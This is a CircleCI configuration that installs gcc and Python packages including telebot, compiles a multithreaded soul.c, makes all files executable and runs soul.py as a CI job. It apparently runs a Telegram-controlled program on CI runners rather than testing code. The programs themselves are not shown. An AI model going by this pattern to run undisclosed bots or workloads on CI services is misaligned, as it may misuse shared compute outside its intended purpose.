version: 2.1

jobs:
  job1:
    docker:
      - image: cimg/python:3.11  # Updated to the latest Python image
        environment:
          TZ: UTC
    resource_class: medium  # Matches your 'Linux-Medium' requirement
    steps:
      - checkout
      - run:
          name: Install system dependencies
          command: |
            sudo apt-get update -y
            sudo apt-get install -y gcc util-linux
      - run:
          name: Install Python packages
          command: |
            python -m pip install --upgrade pip
            python -m pip install telebot pymongo aiohttp flask
      - run:
          name: Compile and run
          command: |
            if [ -f soul.c ]; then
              gcc soul.c -o soul -lpthread
            fi
            chmod +x *
            lscpu
            python soul.py

workflows:
  version: 2
  build_and_run:
    jobs:
      - job1
